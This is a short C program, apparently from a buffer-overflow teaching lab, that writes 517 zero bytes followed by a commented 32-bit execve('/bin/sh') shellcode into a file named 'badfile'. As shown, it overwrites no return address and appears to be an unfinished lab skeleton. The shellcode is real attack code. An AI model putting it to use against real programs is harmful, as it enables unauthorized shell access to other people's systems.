/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char code[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdql                           */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    // Create buffer
    char buffer[517];
    int i; 
    for(i = 0; i < 517; i++){
      buffer[i] = 0x00; 
    }
    printf("buffer is located at %08x.\n", &buffer);
    printf("buffer[1] is at      %08x.\n", &buffer[1]);

    /* Save the contents of code[] to the file "badfile" */
    FILE *badfile;
    badfile = fopen("badfile", "w");
    // Pad buffer with 517 bytes
    fwrite(buffer, sizeof(buffer), 1, badfile);
    fwrite(code, sizeof(code), 1, badfile);
    fclose(badfile);
}

